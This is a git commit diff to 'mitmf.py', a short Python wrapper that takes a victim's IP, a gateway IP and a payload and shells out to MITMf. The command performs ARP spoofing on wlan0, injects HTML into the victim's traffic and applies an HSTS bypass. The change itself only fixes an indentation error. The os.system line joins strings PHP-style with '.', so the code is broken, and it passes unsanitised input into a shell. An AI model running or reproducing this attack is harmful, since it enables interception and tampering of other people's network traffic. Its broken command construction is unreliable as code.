86a9109e6d48e29275e058fce381e7433aa24e38
zarat <zarat@users.noreply.github.com>
2016-06-27 23:08:43 +0200

    Update mitmf.py

--- mitmf.py
+++ mitmf.py
@@ -7,8 +7,7 @@ def parse_args():
     parser.add_argument("-v", "--victimIP", help="IP Adress des Opfers. Beispiel: -v 192.168.0.10")
     parser.add_argument("-r", "--routerIP", help="IP Adresse des Gateway. Beispiel: -r 192.168.0.1")
     parser.add_argument("-p", "--payLoad", help="Payload to inject.")
-
-return parser.parse_args()
+    return parser.parse_args()
 
 os.system('mitmf --spoof --arp -i wlan0 --gateway ' . routerIP . ' --target ' . victimIP . ' --inject --html-payload "' . payLoad . '" --hsts')
 
